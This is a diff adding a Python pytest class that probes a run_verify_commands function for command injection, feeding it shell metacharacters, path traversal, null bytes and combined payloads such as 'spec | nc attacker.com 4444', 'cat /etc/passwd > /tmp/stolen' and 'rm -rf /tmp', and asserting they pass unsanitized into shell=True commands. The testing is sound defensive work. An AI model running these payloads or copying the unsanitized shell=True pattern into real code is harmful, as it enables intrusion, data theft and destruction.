@@ -1085,3 +1085,518 @@ class TestLoadAgentCatalog:
         assert len(result) == 2
         assert "agent-a" in result
         assert "agent-b" in result
+
+
+# ============================================================================
+# Edge Case Tests for Command Injection Prevention
+# ============================================================================
+
+
+class TestEdgeCases:
+    """
+    Tests for edge cases in spec parameter handling.
+
+    This test class verifies that the run_verify_commands function and other
+    functions that handle spec parameters properly sanitize or validate input
+    to prevent command injection vulnerabilities.
+
+    Tests cover:
+    1. Empty spec values
+    2. Special characters and shell metacharacters
+    3. Unicode characters and internationalization
+    4. Path traversal attempts
+    5. Null byte injection
+    6. Format string injection
+    7. Long input strings
+    """
+
+    def test_run_verify_commands_empty_spec(self) -> None:
+        """
+        Test that empty spec value is handled correctly.
+
+        An empty spec could cause issues with command construction or
+        lead to unexpected behavior in the rendered command.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        with patch("subprocess.run", return_value=mock_proc) as mock_run:
+            result = run_verify_commands(["echo {spec}"], "")
+
+            # Verify the command was executed
+            assert mock_run.called
+            call_kwargs = mock_run.call_args[1]
+
+            # The command should still be executed with shell=True
+            assert call_kwargs.get("shell") is True
+
+            # The empty string should result in just the base command
+            assert len(result) == 1
+            assert result[0]["command"] == "echo "
+
+    def test_run_verify_commands_special_characters(self) -> None:
+        """
+        Test that special shell metacharacters in spec are handled.
+
+        This test verifies that various shell metacharacters that could
+        be used for command injection are present in the rendered command,
+        demonstrating the current vulnerability.
+
+        Characters tested:
+        - Semicolon (;): Command chaining
+        - Ampersand (&): Background execution
+        - Pipe (|): Command pipelining
+        - Backtick (`): Command substitution
+        - Dollar sign ($): Variable expansion
+        - Backslash (\\): Escape character
+        - Newline: Command separator
+        - Tab: Whitespace that could affect parsing
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        special_char_specs = [
+            ("spec;test", "Semicolon command chaining"),
+            ("spec&test", "Ampersand background execution"),
+            ("spec|test", "Pipe command pipelining"),
+            ("spec`test`", "Backtick command substitution"),
+            ("spec$test", "Dollar sign variable expansion"),
+            ("spec\\test", "Backslash escape character"),
+            ("spec\ntest", "Newline command separator"),
+            ("spec\ttest", "Tab character"),
+            ("spec; echo pwned", "Semicolon with command injection"),
+            ("spec && malicious", "AND operator chaining"),
+            ("spec || malicious", "OR operator chaining"),
+            ("spec > /tmp/file", "Output redirection"),
+            ("spec < /etc/passwd", "Input redirection"),
+            ("spec$(whoami)", "Dollar-paren command substitution"),
+            ("spec`id`", "Backtick command substitution"),
+        ]
+
+        for spec, description in special_char_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                call_kwargs = mock_run.call_args[1]
+
+                # Verify shell=True is used (enables injection)
+                assert call_kwargs.get("shell") is True, \
+                    f"shell=True not set for: {description}"
+
+                # Verify the special characters are present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Special characters not preserved for: {description}"
+
+    def test_run_verify_commands_unicode_characters(self) -> None:
+        """
+        Test that Unicode characters in spec are handled correctly.
+
+        This test verifies that various Unicode characters, including
+        international characters, emojis, and special Unicode symbols,
+        are properly handled without causing encoding issues or
+        unexpected behavior.
+
+        Unicode categories tested:
+        - Latin extended characters
+        - Cyrillic characters
+        - Chinese/Japanese/Korean characters
+        - Arabic characters
+        - Emoji
+        - Right-to-left text
+        - Zero-width characters
+        - Unicode control characters
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        unicode_specs = [
+            ("spéc-chäräçtërs", "Latin extended characters with accents"),
+            ("спец-имя", "Cyrillic characters"),
+            ("スペック", "Japanese Hiragana/Katakana"),
+            ("规格", "Chinese characters"),
+            ("مواصفات", "Arabic characters"),
+            ("spec-😀-test", "Emoji characters"),
+            ("spec-🎉-test", "Party emoji"),
+            ("spec-💀-test", "Skull emoji"),
+            ("spec-test\u200b", "Zero-width space"),
+            ("spec-test\u200c", "Zero-width non-joiner"),
+            ("spec-test\u200d", "Zero-width joiner"),
+            ("spec-test\u202e", "Right-to-left override"),
+            ("spec-test\u202a", "Left-to-right embedding"),
+            ("spëc-cäsë", "Multiple Unicode characters"),
+            ("spec-α-β-γ", "Greek letters"),
+            ("spec-עברית", "Hebrew characters"),
+            ("spec-한국어", "Korean characters"),
+            ("spec-ไทย", "Thai characters"),
+            ("spec-†-‡-§", "Typography symbols"),
+        ]
+
+        for spec, description in unicode_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed without errors
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the spec is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Unicode characters not preserved for: {description}"
+
+    def test_run_verify_commands_path_traversal_attempts(self) -> None:
+        """
+        Test that path traversal attempts in spec are handled.
+
+        This test verifies that various path traversal patterns are
+        present in the rendered command, demonstrating the potential
+        for path traversal attacks if the command execution environment
+        allows file system access.
+
+        Path traversal patterns tested:
+        - Parent directory references (..)
+        - Current directory references (.)
+        - Absolute paths
+        - Windows paths
+        - Encoded traversal attempts
+        - Mixed traversal patterns
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        path_traversal_specs = [
+            ("../etc/passwd", "Parent directory traversal"),
+            ("../../etc/passwd", "Multiple parent directory traversals"),
+            ("../../../etc/passwd", "Deep parent directory traversal"),
+            ("./hidden", "Current directory reference"),
+            (".././etc", "Mixed parent and current directory"),
+            ("/etc/passwd", "Absolute path"),
+            ("/absolute/path/to/file", "Absolute path to file"),
+            ("..-..-etc", "Encoded parent directory with dashes"),
+            ("C:\\Windows\\System32", "Windows absolute path"),
+            ("C:/Windows/System32", "Windows path with forward slash"),
+            ("D:\\path\\to\\file", "Windows drive letter path"),
+            ("path\\with\\backslash", "Path with backslash separator"),
+            ("/../etc", "Absolute path with traversal"),
+            ("..\\../etc", "Mixed separator traversal"),
+            ("../path/./etc", "Mixed traversal patterns"),
+            (".../test", "Multiple dots (contains ..)"),
+            ("....test", "Multiple dots (contains ..)"),
+            ("./test/../etc", "Current directory with traversal"),
+            ("../test/../etc", "Multiple parent directory references"),
+        ]
+
+        for spec, description in path_traversal_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                call_kwargs = mock_run.call_args[1]
+
+                # Verify shell=True is used
+                assert call_kwargs.get("shell") is True, \
+                    f"shell=True not set for: {description}"
+
+                # Verify the path traversal pattern is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Path traversal pattern not preserved for: {description}"
+
+    def test_run_verify_commands_null_byte_injection(self) -> None:
+        """
+        Test that null byte injection attempts are handled.
+
+        Null bytes can be used to bypass string validation or terminate
+        strings early, potentially leading to security vulnerabilities.
+        This test verifies that null bytes in the spec parameter are
+        present in the rendered command.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        null_byte_specs = [
+            ("spec\x00null", "Null byte in middle"),
+            ("\x00spec", "Null byte at start"),
+            ("spec\x00", "Null byte at end"),
+            ("spec\x00\x00test", "Multiple null bytes"),
+            ("\x00", "Pure null byte"),
+            ("spec\x00; malicious", "Null byte before command injection"),
+        ]
+
+        for spec, description in null_byte_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the null byte is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert "\x00" in rendered_command, \
+                    f"Null byte not preserved for: {description}"
+
+    def test_run_verify_commands_format_string_injection(self) -> None:
+        """
+        Test that format string injection attempts are handled.
+
+        While the current implementation uses simple string replacement
+        (not str.format()), this test verifies that attempts to inject
+        format strings are handled correctly.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        format_string_specs = [
+            ("{spec}", "Recursive placeholder"),
+            ("{{spec}}", "Escaped placeholder"),
+            ("{0}", "Positional format placeholder"),
+            ("{name}", "Named format placeholder"),
+            ("%.1f", "Printf-style format"),
+            ("%s", "Printf-style string format"),
+            ("%x", "Printf-style hex format"),
+        ]
+
+        for spec, description in format_string_specs:
+            with patch("subprocess.run", return_value=mock_proc):
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # The placeholder should be replaced
+                rendered_command = result[0]["command"]
+                # After replacement, the spec should be in the command
+                # (though format strings might cause unexpected behavior)
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+    def test_run_verify_commands_long_input(self) -> None:
+        """
+        Test that very long spec values are handled correctly.
+
+        Long input strings could potentially cause buffer overflows,
+        performance issues, or other problems. This test verifies that
+        long inputs are processed without errors.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        # Test various long input scenarios
+        long_specs = [
+            ("a" * 1000, "1000 character string"),
+            ("a" * 10000, "10000 character string"),
+            ("a" * 100000, "100000 character string"),
+            ("../" * 100, "100 parent directory traversals"),
+            ("a" * 100 + ";" + "b" * 100, "Long string with injection"),
+            ("😀" * 100, "100 emoji characters"),
+            ("spec-" + "-".join([f"test{i}" for i in range(100)]), "Many dashed components"),
+        ]
+
+        for spec, description in long_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the long spec is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Long spec not preserved for: {description}"
+
+    def test_run_verify_commands_whitespace_variations(self) -> None:
+        """
+        Test that various whitespace patterns are handled correctly.
+
+        Whitespace variations can sometimes be used to bypass validation
+        or cause unexpected command parsing behavior.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        whitespace_specs = [
+            ("spec test", "Single space"),
+            ("spec  test", "Double space"),
+            ("spec   test", "Multiple spaces"),
+            ("spec\ttest", "Tab character"),
+            ("spec\ntest", "Newline character"),
+            ("spec\rtest", "Carriage return"),
+            ("spec\r\ntest", "Carriage return + newline"),
+            (" spec", "Leading space"),
+            ("spec ", "Trailing space"),
+            (" spec ", "Leading and trailing spaces"),
+            ("spec\t\n\rtest", "Multiple whitespace types"),
+            ("spec \t test", "Mixed space and tab"),
+            ("  \t\nspec\t\n  ", "Whitespace on both sides"),
+        ]
+
+        for spec, description in whitespace_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the whitespace is preserved in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Whitespace not preserved for: {description}"
+
+    def test_run_verify_commands_quote_variations(self) -> None:
+        """
+        Test that various quote patterns are handled correctly.
+
+        Quotes can be used to break out of command arguments and inject
+        arbitrary commands. This test verifies that quote characters are
+        present in the rendered command.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        quote_specs = [
+            ("spec'test", "Single quote"),
+            ('spec"test', "Double quote"),
+            ("spec`test", "Backtick"),
+            ("spec'test'; malicious", "Single quote with injection"),
+            ('spec"test"; malicious', "Double quote with injection"),
+            ("spec\\'test", "Escaped single quote"),
+            ("spec\\\"test", "Escaped double quote"),
+            ("spec'test'\"test\"", "Mixed quotes"),
+            ("'spec'", "Single quoted spec"),
+            ('"spec"', "Double quoted spec"),
+            ("'spec'; malicious", "Single quoted with injection"),
+            ("\"spec\"; malicious", "Double quoted with injection"),
+        ]
+
+        for spec, description in quote_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the quotes are preserved in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Quotes not preserved for: {description}"
+
+    def test_run_verify_commands_combined_attacks(self) -> None:
+        """
+        Test that combined attack patterns are handled.
+
+        This test verifies that combinations of multiple attack vectors
+        (e.g., path traversal + command injection, Unicode + special characters)
+        are present in the rendered command.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        combined_attack_specs = [
+            ("../etc; rm -rf /tmp", "Path traversal + command chaining"),
+            ("spec; cd /etc; cat passwd", "Command chaining with multiple commands"),
+            ("spec && cat /etc/passwd > /tmp/stolen", "AND operator + data exfiltration"),
+            ("spec | nc attacker.com 4444", "Pipe + reverse shell"),
+            ("spec$(whoami); malicious", "Command substitution + injection"),
+            ("spec`id` && malicious", "Backtick substitution + AND operator"),
+            ("spéc; rm -rf /tmp", "Unicode + command chaining"),
+            ("spec\x00; malicious", "Null byte + command injection"),
+            ("../\nmalicious", "Path traversal + newline separator"),
+            ("spec; touch /tmp/pwned # &&", "Command chaining + comment"),
+        ]
+
+        for spec, description in combined_attack_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                call_kwargs = mock_run.call_args[1]
+
+                # Verify shell=True is used (enables the injection)
+                assert call_kwargs.get("shell") is True, \
+                    f"shell=True not set for: {description}"
+
+                # Verify the combined attack is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Combined attack not preserved for: {description}"
+
+    def test_run_verify_commands_edge_case_combinations(self) -> None:
+        """
+        Test additional edge case combinations.
+
+        This test covers miscellaneous edge cases and unusual input
+        patterns that might not fit into other categories.
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        edge_case_specs = [
+            ("", "Empty string"),
+            ("-", "Single dash"),
+            ("--", "Double dash"),
+            ("...", "Three dots (contains ..)"),
+            ("....", "Four dots (contains ..)"),
+            ("-", "Single dash"),
+            ("_", "Single underscore"),
+            (".", "Single dot"),
+            (" ", "Single space"),
+            ("spec\n", "Trailing newline"),
+            ("\nspec", "Leading newline"),
+            ("spec\r\n", "Trailing CRLF"),
+            ("---", "Multiple dashes"),
+            ("___", "Multiple underscores"),
+            ("...", "Multiple dots"),
+            ("   ", "Multiple spaces"),
+            ("spec-.-test", "Dash-dot-dash pattern"),
+            ("spec_.-test", "Underscore-dot-dash pattern"),
+            ("-.-", "Dash-dot-dash only"),
+            ("_.-._", "Underscore combinations"),
+            ("spec!test", "Exclamation mark"),
+            ("spec@test", "At sign"),
+            ("spec#test", "Hash sign"),
+            ("spec$test", "Dollar sign"),
+            ("spec%test", "Percent sign"),
+            ("spec&test", "Ampersand"),
+            ("spec*test", "Asterisk"),
+            ("spec?test", "Question mark"),
+        ]
+
+        for spec, description in edge_case_specs:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                result = run_verify_commands(["pytest {spec}"], spec)
+
+                # Verify the command was executed
+                assert mock_run.called, f"Command not executed for: {description}"
+                assert len(result) == 1, f"Result length incorrect for: {description}"
+
+                # Verify the spec is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert spec in rendered_command, \
+                    f"Edge case not preserved for: {description}"
